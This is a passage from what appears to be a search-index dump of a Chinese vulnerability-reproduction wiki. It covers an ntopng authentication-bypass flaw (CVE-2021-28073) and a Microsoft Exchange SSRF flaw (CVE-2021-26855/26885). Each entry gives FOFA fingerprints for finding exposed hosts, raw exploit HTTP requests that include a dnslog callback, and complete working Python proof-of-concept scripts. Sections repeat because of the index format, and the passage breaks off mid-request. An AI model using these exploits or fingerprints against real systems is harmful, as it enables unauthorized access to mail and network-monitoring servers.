\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e CVE-2021-28073 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 ntopng\u662f\u4e00\u6b3e\u57fa\u4e8eWeb\u7684\u6d41\u91cf\u5206\u6790\u4e0e\u96c6\u6d41\u5de5\u5177\u30022021\u5e743\u670824\u65e5\uff0c\u963f\u91cc\u4e91\u5e94\u6025\u54cd\u5e94\u4e2d\u5fc3\u76d1\u6d4b\u5230\u56fd\u5185\u67d0\u5b89\u5168\u56e2\u961f\u516c\u5f00\u62ab\u9732 ntopng \u6743\u9650\u7ed5\u8fc7\u4e0e\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u5176CVE\u53f7\u4e3a CVE-2021-28073\u3001CVE-2021-28074\u3002\u653b\u51fb\u8005\u53ef\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u7ed5\u8fc7\u76f8\u5173\u8ba4\u8bc1\uff0c\u914d\u5408\u76f8\u5173\u529f\u80fd\u9020\u6210\u4efb\u610f\u4ee3\u7801\u6267\u884c\uff0c\u63a7\u5236\u670d\u52a1\u5668\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] ntopng commit < e8b9721479f401f595c5c7bb151819aceb03ad71 FOFA \u00b6 [!NOTE] app=\"ntopng\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6f0f\u6d1e\u5229\u7528POC \u00b6 \u8ba1\u7b97\u51fantopng lua\u76ee\u5f55\u7684\u957f\u5ea6 python3 poc.py --url http://192.168.204.131:3000/ baselength \u751f\u6210\u8d8a\u6743\u8bbf\u95eeURL python3 poc.py --url http://192.168.204.131:3000/ generate -l 36 -p find_prefs.lua import sys import requests import argparse import logging def is_ntopng () -> bool : response = session . get ( base_url , allow_redirects = False ) return response . status_code == 302 and '/lua/login.lua' in response . headers . get ( 'Location' , '' ) def get_base_length () -> int : for i in range ( 90 , 120 ): url = base_url + '/lua/' + ' %2e%2f ' * i + 'as_stats.lua.css' response = session . get ( url , allow_redirects = False ) if response . status_code < 300 : return 255 - 1 - i * 2 - len ( 'as_stats.lua' ) for i in range ( 90 , 120 ): url = base_url + '/lua/' + ' %2e%2f ' * i + 'get_macs_data.lua.css' response = session . get ( url , allow_redirects = False ) if response . status_code < 300 : return 255 - 1 - i * 2 - len ( 'get_macs_data.lua' ) return - 1 def get_padding_length ( path : str ): padding_length = 255 - 1 - base_length - len ( path ) if padding_length % 2 == 1 : raise RuntimeError ( f 'path { path } is not support' ) return int ( padding_length / 2 ) logging . basicConfig ( stream = sys . stderr , level = logging . WARNING ) session = requests . Session () session . headers [ 'User-Agent' ] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36' if __name__ == '__main__' : parser = argparse . ArgumentParser ( description = 'CVE-2021-28073 POC for ntopng.' ) parser . add_argument ( '-u' , '--url' , help = 'base url for ntopng, eg: http://192.168.1.233:3000' , metavar = '<URL>' , required = True ) parser . add_argument ( '-v' , '--verbose' , default = False , action = 'store_true' ) subparsers = parser . add_subparsers ( dest = 'action' ) baselength_command = subparsers . add_parser ( 'baselength' , help = 'get base path length of ntopng' ) generate_command = subparsers . add_parser ( 'generate' , help = 'generate the authenticate bypass url' ) generate_command . add_argument ( '-l' , '--length' , type = int , help = 'base path length of target ntopng' , metavar = '<LENGTH>' , required = True ) generate_command . add_argument ( '-p' , '--path' , help = 'lua pathname' , metavar = '<PATH>' , required = True ) generate_command = subparsers . add_parser ( 'include' , help = 'generate the arbitrary file inclusion url' ) generate_command . add_argument ( '-l' , '--length' , type = int , help = 'base path length of target ntopng' , metavar = '<LENGTH>' , required = True ) generate_command . add_argument ( '-i' , '--include' , help = 'path to include' , metavar = '<PATH>' , required = True ) args = parser . parse_args () if not args . action : parser . print_help () sys . exit ( 1 ) if args . verbose : logging . basicConfig ( stream = sys . stderr , level = logging . DEBUG ) base_url = args . url . rstrip ( '/' ) # check target if not is_ntopng (): raise RuntimeError ( 'No Ntopng detected' ) if args . action == 'baselength' : base_length = get_base_length () sys . stdout . write ( f 'ntopng install path length: { base_length } \\n ' ) elif args . action == 'generate' : base_length = args . length path = args . path sys . stdout . write ( base_url + '/lua/' + ' %2e%2f ' * get_padding_length ( path ) + path + '.css \\n ' )","title":"HongKe ntopng \u6d41\u91cf\u5206\u6790\u7cfb\u7edf \u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e CVE-2021-28073"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/HongKe/HongKe%20ntopng%20%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2021-28073/#hongke-ntopng-\u6d41\u91cf\u5206\u6790\u7cfb\u7edf-\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e-cve-2021-28073","text":"","title":"HongKe ntopng \u6d41\u91cf\u5206\u6790\u7cfb\u7edf \u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e CVE-2021-28073"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/HongKe/HongKe%20ntopng%20%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2021-28073/#\u6f0f\u6d1e\u63cf\u8ff0","text":"ntopng\u662f\u4e00\u6b3e\u57fa\u4e8eWeb\u7684\u6d41\u91cf\u5206\u6790\u4e0e\u96c6\u6d41\u5de5\u5177\u30022021\u5e743\u670824\u65e5\uff0c\u963f\u91cc\u4e91\u5e94\u6025\u54cd\u5e94\u4e2d\u5fc3\u76d1\u6d4b\u5230\u56fd\u5185\u67d0\u5b89\u5168\u56e2\u961f\u516c\u5f00\u62ab\u9732 ntopng \u6743\u9650\u7ed5\u8fc7\u4e0e\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u5176CVE\u53f7\u4e3a CVE-2021-28073\u3001CVE-2021-28074\u3002\u653b\u51fb\u8005\u53ef\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u7ed5\u8fc7\u76f8\u5173\u8ba4\u8bc1\uff0c\u914d\u5408\u76f8\u5173\u529f\u80fd\u9020\u6210\u4efb\u610f\u4ee3\u7801\u6267\u884c\uff0c\u63a7\u5236\u670d\u52a1\u5668\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/HongKe/HongKe%20ntopng%20%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2021-28073/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] ntopng commit < e8b9721479f401f595c5c7bb151819aceb03ad71","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/HongKe/HongKe%20ntopng%20%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2021-28073/#fofa","text":"[!NOTE] app=\"ntopng\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/HongKe/HongKe%20ntopng%20%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2021-28073/#\u6f0f\u6d1e\u590d\u73b0","text":"","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/HongKe/HongKe%20ntopng%20%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2021-28073/#\u6f0f\u6d1e\u5229\u7528poc","text":"\u8ba1\u7b97\u51fantopng lua\u76ee\u5f55\u7684\u957f\u5ea6 python3 poc.py --url http://192.168.204.131:3000/ baselength \u751f\u6210\u8d8a\u6743\u8bbf\u95eeURL python3 poc.py --url http://192.168.204.131:3000/ generate -l 36 -p find_prefs.lua import sys import requests import argparse import logging def is_ntopng () -> bool : response = session . get ( base_url , allow_redirects = False ) return response . status_code == 302 and '/lua/login.lua' in response . headers . get ( 'Location' , '' ) def get_base_length () -> int : for i in range ( 90 , 120 ): url = base_url + '/lua/' + ' %2e%2f ' * i + 'as_stats.lua.css' response = session . get ( url , allow_redirects = False ) if response . status_code < 300 : return 255 - 1 - i * 2 - len ( 'as_stats.lua' ) for i in range ( 90 , 120 ): url = base_url + '/lua/' + ' %2e%2f ' * i + 'get_macs_data.lua.css' response = session . get ( url , allow_redirects = False ) if response . status_code < 300 : return 255 - 1 - i * 2 - len ( 'get_macs_data.lua' ) return - 1 def get_padding_length ( path : str ): padding_length = 255 - 1 - base_length - len ( path ) if padding_length % 2 == 1 : raise RuntimeError ( f 'path { path } is not support' ) return int ( padding_length / 2 ) logging . basicConfig ( stream = sys . stderr , level = logging . WARNING ) session = requests . Session () session . headers [ 'User-Agent' ] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36' if __name__ == '__main__' : parser = argparse . ArgumentParser ( description = 'CVE-2021-28073 POC for ntopng.' ) parser . add_argument ( '-u' , '--url' , help = 'base url for ntopng, eg: http://192.168.1.233:3000' , metavar = '<URL>' , required = True ) parser . add_argument ( '-v' , '--verbose' , default = False , action = 'store_true' ) subparsers = parser . add_subparsers ( dest = 'action' ) baselength_command = subparsers . add_parser ( 'baselength' , help = 'get base path length of ntopng' ) generate_command = subparsers . add_parser ( 'generate' , help = 'generate the authenticate bypass url' ) generate_command . add_argument ( '-l' , '--length' , type = int , help = 'base path length of target ntopng' , metavar = '<LENGTH>' , required = True ) generate_command . add_argument ( '-p' , '--path' , help = 'lua pathname' , metavar = '<PATH>' , required = True ) generate_command = subparsers . add_parser ( 'include' , help = 'generate the arbitrary file inclusion url' ) generate_command . add_argument ( '-l' , '--length' , type = int , help = 'base path length of target ntopng' , metavar = '<LENGTH>' , required = True ) generate_command . add_argument ( '-i' , '--include' , help = 'path to include' , metavar = '<PATH>' , required = True ) args = parser . parse_args () if not args . action : parser . print_help () sys . exit ( 1 ) if args . verbose : logging . basicConfig ( stream = sys . stderr , level = logging . DEBUG ) base_url = args . url . rstrip ( '/' ) # check target if not is_ntopng (): raise RuntimeError ( 'No Ntopng detected' ) if args . action == 'baselength' : base_length = get_base_length () sys . stdout . write ( f 'ntopng install path length: { base_length } \\n ' ) elif args . action == 'generate' : base_length = args . length path = args . path sys . stdout . write ( base_url + '/lua/' + ' %2e%2f ' * get_padding_length ( path ) + path + '.css \\n ' )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Microsoft%20Exchange/Microsoft%20Exchange%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-26885/","text":"Microsoft Exchange SSRF\u6f0f\u6d1e CVE-2021-26885 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Exchange Server \u662f\u5fae\u8f6f\u516c\u53f8\u7684\u4e00\u5957\u7535\u5b50\u90ae\u4ef6\u670d\u52a1\u7ec4\u4ef6\uff0c\u662f\u4e2a\u6d88\u606f\u4e0e\u534f\u4f5c\u7cfb\u7edf\u30022021\u5e7403\u67083\u65e5\uff0c\u5fae\u8f6f\u5b98\u65b9\u53d1\u5e03\u4e86Microsoft Exchange\u5b89\u5168\u66f4\u65b0\uff0c\u62ab\u9732\u4e86\u591a\u4e2a\u9ad8\u5371\u4e25\u91cd\u6f0f\u6d1e\uff0c\u5176\u4e2d\uff1a\u5728 CVE-2021-26855 Exchange SSRF\u6f0f\u6d1e\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u76f4\u63a5\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u4ee5Exchange server\u7684\u8eab\u4efd\u53d1\u8d77\u4efb\u610fHTTP\u8bf7\u6c42\uff0c\u626b\u63cf\u5185\u7f51\uff0c\u5e76\u4e14\u53ef\u83b7\u53d6Exchange\u7528\u6237\u4fe1\u606f\u3002\u8be5\u6f0f\u6d1e\u5229\u7528\u65e0\u9700\u8eab\u4efd\u8ba4\u8bc1 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Exchange 2013 Versions < 15.00.1497.012, Exchange 2016 CU18 < 15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009, Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010 FOFA \u00b6 [!NOTE] icon_hash=\"1768726119\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u4e0e SSRF \u6709\u5173\u7684\u6587\u4ef6 /owa/auth/Current/themes/resources/logon.css /owa/auth/Current/themes/resources/... /ecp/default.flt /ecp/main.css /ecp/<single char>.js \u67e5\u770b\u8865\u4e01\u4e2d\u7684\u6539\u53d8\uff0c\u53ef\u4ee5\u770b\u5230\u6709\u5173 BackEndServer \u4f7f\u7528\u7684\u7c7b\u5173\u4e8e BEResourceRequestHandler \u7684\u6539\u53d8 \u4fee\u590d BEResourceRequestHandler \u4f7f\u7528\u7684 BakcEndServer\u7c7b\u7684\u8865\u4e01 \u67e5\u770b\u8c03\u7528**BERsourceRequestHandler** \u7684\u65b9\u6cd5 SelectHandlerForUnauthenticatedRequest \u67e5\u627e\u76f8\u5173\u8def\u5f84 ProxyMoudle \u53ef\u4ee5\u4ece\u4e2d\u770b\u5230\u9700\u8981\u5e26\u6709 EXP\u534f\u8bae(\u4f8b\u5982\u8def\u5f84 /ecp/), Cookie\u53c2\u6570 X-BEResponse , \u8fd8\u6709\u4ee5\u9759\u6001\u6269\u5c55\u540d\u7ed3\u5c3e\u7684 URL (\u4f8b\u5982 x.js, x.css\u7b49) \u800c\u5176\u4e2d\u7684\u8bf7\u6c42\u4e3a HttpProxy \u6765\u5b9e\u73b0\u7684\uff0c\u6240\u4ee5\u5927\u90e8\u5206\u7684POC\u4e2d\u8bf7\u6c42\u7684\u6587\u4ef6\u4e3a**/etc/y.js** \u8fd9\u6837\u7c7b\u4f3c\u4e0d\u5b58\u5728\u7684\u6587\u4ef6 \u53c2\u6570 X-BEResource \u89e3\u6790\u5728 BackEndServer.FromString \u8ddf\u8e2a BackEndServer**\u5bf9\u8c61\uff0c \u5176\u4e2d\u8be5\u5bf9\u8c61\u4f7f\u7528 **ProxyRequestHandler \u5411\u4e3b\u673a\u53d1\u9001\u8bf7\u6c42 \u8fd9\u91cc\u8fdb\u884cSSRF\u7684\u6f0f\u6d1e\u590d\u73b0\uff0c\u9996\u5148\u8bbf\u95ee /ecp/PeiQi.js \u6587\u4ef6 \u5e76\u8bbe\u7f6eCookie X-BEResource=peiqi_wiki/api/endpoint#~1; X-AnonResource=true GET /ecp/PeiQi.js HTTP/1.1 Host: xxx.xxx.com Connection: close sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: image Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: X-BEResource=peiqi_wiki/api/endpoint#~1; X-AnonResource=true \u7528\u8fd9\u6837\u7684\u65b9\u5f0f\u8bf7\u6c42\u53ef\u4ee5\u786e\u5b9a\u662f\u5426\u5b58\u5728 SSRF\u6f0f\u6d1e \u54cd\u5e94\u5305\u4e3a: NegotiateSecurityContext failed with for host 'peiqi_wiki' with status 'TargetUnknown' \u663e\u793a\u8fd9\u6837\u7684\u5c31\u662f\u53ef\u80fd\u5b58\u5728\u4e86 \u5728\u901a\u8fc7\u53d1\u9001\u4e00\u4e2a\u8bf7\u6c42\u7ed9 Dnslog\u786e\u8ba4\u662f\u5426\u5b58\u5728 SSRF\u7ed9 Dnslog\u53d1\u9001\u4e86\u4e00\u4e2a\u8bf7\u6c42 GET /owa/auth/PeiQi.js HTTP/1.1 Host: xxx.xxx.com Connection: close sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: image Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: X-AnonResource=true; X-AnonResource-Backend=ianqsx.dnslog.cn/ecp/default.flt?~3; X-BEResource=ianqsx.dnslog.cn/owa/auth/logon.aspx?~3; [!NOTE] Cookie: X-AnonResource=true; X-AnonResource-Backend=ianqsx.dnslog.cn/ecp/default.flt?~3; X-BEResource=ianqsx.dnslog.cn/owa/auth/logon.aspx?~3; \u5c06\u5176\u4e2d\u7684 Dnslog\u6362\u6210\u81ea\u5df1\u7684 \u786e\u5b9a\u6536\u5230\u4e86\u7531\u670d\u52a1\u7aef\u53d1\u9001\u7684\u8bf7\u6c42\uff0c\u5b58\u5728SSRF\u6f0f\u6d1e \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import random import re import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Microsoft Exchange\u591a\u4e2a\u7248\u672c \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> mail.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mDnslog >>> xxxx.dnslog.cn \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = \"https://\" + target_url + \"/ecp/PeiQi.js\" headers = { 'Cookie' : 'X-BEResource=peiqi_wiki/api/endpoint#~1; X-AnonResource=true' } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if response . status_code == 500 and 'NegotiateSecurityContext' in response . text and 'peiqi_wiki' in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728SSRF\u6f0f\u6d1e\uff0c \u8f93\u5165Dnslog\u5730\u5740\u8fdb\u4e00\u6b65\u68c0\u6d4b.... \\033 [0m\" . format ( target_url )) dnslog = str ( input ( \" \\033 [35mDnslog >>> \\033 [0m\" )) POC_2 ( target_url , dnslog ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728SSRF\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , dnslog ): vuln_url = \"https://\" + target_url + \"/owa/auth/PeiQi.js\" headers = { 'Cookie' : 'X-AnonResource=true; X-AnonResource-Backend= {} /ecp/default.flt?~3; X-BEResource= {} /owa/auth/logon.aspx?~3;' . format ( dnslog , dnslog ) } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u8bf7\u67e5\u770b Dnslog\uff1a {} \u54cd\u5e94.... \\033 [0m\" . format ( dnslog )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) Goby & POC \u00b6 [!NOTE] Microsoft Exchange SSRF\u6f0f\u6d1e CVE-2021-26885","title":"Microsoft Exchange SSRF\u6f0f\u6d1e CVE-2021-26885"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Microsoft%20Exchange/Microsoft%20Exchange%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-26885/#microsoft-exchange-ssrf\u6f0f\u6d1e-cve-2021-26885","text":"","title":"Microsoft Exchange SSRF\u6f0f\u6d1e CVE-2021-26885"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Microsoft%20Exchange/Microsoft%20Exchange%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-26885/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Exchange Server \u662f\u5fae\u8f6f\u516c\u53f8\u7684\u4e00\u5957\u7535\u5b50\u90ae\u4ef6\u670d\u52a1\u7ec4\u4ef6\uff0c\u662f\u4e2a\u6d88\u606f\u4e0e\u534f\u4f5c\u7cfb\u7edf\u30022021\u5e7403\u67083\u65e5\uff0c\u5fae\u8f6f\u5b98\u65b9\u53d1\u5e03\u4e86Microsoft Exchange\u5b89\u5168\u66f4\u65b0\uff0c\u62ab\u9732\u4e86\u591a\u4e2a\u9ad8\u5371\u4e25\u91cd\u6f0f\u6d1e\uff0c\u5176\u4e2d\uff1a\u5728 CVE-2021-26855 Exchange SSRF\u6f0f\u6d1e\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u76f4\u63a5\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u4ee5Exchange server\u7684\u8eab\u4efd\u53d1\u8d77\u4efb\u610fHTTP\u8bf7\u6c42\uff0c\u626b\u63cf\u5185\u7f51\uff0c\u5e76\u4e14\u53ef\u83b7\u53d6Exchange\u7528\u6237\u4fe1\u606f\u3002\u8be5\u6f0f\u6d1e\u5229\u7528\u65e0\u9700\u8eab\u4efd\u8ba4\u8bc1","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Microsoft%20Exchange/Microsoft%20Exchange%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-26885/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Exchange 2013 Versions < 15.00.1497.012, Exchange 2016 CU18 < 15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009, Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Microsoft%20Exchange/Microsoft%20Exchange%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-26885/#fofa","text":"[!NOTE] icon_hash=\"1768726119\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Microsoft%20Exchange/Microsoft%20Exchange%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-26885/#\u6f0f\u6d1e\u590d\u73b0","text":"\u4e0e SSRF \u6709\u5173\u7684\u6587\u4ef6 /owa/auth/Current/themes/resources/logon.css /owa/auth/Current/themes/resources/... /ecp/default.flt /ecp/main.css /ecp/<single char>.js \u67e5\u770b\u8865\u4e01\u4e2d\u7684\u6539\u53d8\uff0c\u53ef\u4ee5\u770b\u5230\u6709\u5173 BackEndServer \u4f7f\u7528\u7684\u7c7b\u5173\u4e8e BEResourceRequestHandler \u7684\u6539\u53d8 \u4fee\u590d BEResourceRequestHandler \u4f7f\u7528\u7684 BakcEndServer\u7c7b\u7684\u8865\u4e01 \u67e5\u770b\u8c03\u7528**BERsourceRequestHandler** \u7684\u65b9\u6cd5 SelectHandlerForUnauthenticatedRequest \u67e5\u627e\u76f8\u5173\u8def\u5f84 ProxyMoudle \u53ef\u4ee5\u4ece\u4e2d\u770b\u5230\u9700\u8981\u5e26\u6709 EXP\u534f\u8bae(\u4f8b\u5982\u8def\u5f84 /ecp/), Cookie\u53c2\u6570 X-BEResponse , \u8fd8\u6709\u4ee5\u9759\u6001\u6269\u5c55\u540d\u7ed3\u5c3e\u7684 URL (\u4f8b\u5982 x.js, x.css\u7b49) \u800c\u5176\u4e2d\u7684\u8bf7\u6c42\u4e3a HttpProxy \u6765\u5b9e\u73b0\u7684\uff0c\u6240\u4ee5\u5927\u90e8\u5206\u7684POC\u4e2d\u8bf7\u6c42\u7684\u6587\u4ef6\u4e3a**/etc/y.js** \u8fd9\u6837\u7c7b\u4f3c\u4e0d\u5b58\u5728\u7684\u6587\u4ef6 \u53c2\u6570 X-BEResource \u89e3\u6790\u5728 BackEndServer.FromString \u8ddf\u8e2a BackEndServer**\u5bf9\u8c61\uff0c \u5176\u4e2d\u8be5\u5bf9\u8c61\u4f7f\u7528 **ProxyRequestHandler \u5411\u4e3b\u673a\u53d1\u9001\u8bf7\u6c42 \u8fd9\u91cc\u8fdb\u884cSSRF\u7684\u6f0f\u6d1e\u590d\u73b0\uff0c\u9996\u5148\u8bbf\u95ee /ecp/PeiQi.js \u6587\u4ef6 \u5e76\u8bbe\u7f6eCookie X-BEResource=peiqi_wiki/api/endpoint#~1; X-AnonResource=true GET /ecp/PeiQi.js HTTP/1.1 Host: xxx.xxx.com Connection: close sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: image Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: X-BEResource=peiqi_wiki/api/endpoint#~1; X-AnonResource=true \u7528\u8fd9\u6837\u7684\u65b9\u5f0f\u8bf7\u6c42\u53ef\u4ee5\u786e\u5b9a\u662f\u5426\u5b58\u5728 SSRF\u6f0f\u6d1e \u54cd\u5e94\u5305\u4e3a: NegotiateSecurityContext failed with for host 'peiqi_wiki' with status 'TargetUnknown' \u663e\u793a\u8fd9\u6837\u7684\u5c31\u662f\u53ef\u80fd\u5b58\u5728\u4e86 \u5728\u901a\u8fc7\u53d1\u9001\u4e00\u4e2a\u8bf7\u6c42\u7ed9 Dnslog\u786e\u8ba4\u662f\u5426\u5b58\u5728 SSRF\u7ed9 Dnslog\u53d1\u9001\u4e86\u4e00\u4e2a\u8bf7\u6c42 GET /owa/auth/PeiQi.js HTTP/1.1 Host: xxx.xxx.com Connection: close sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Accept: 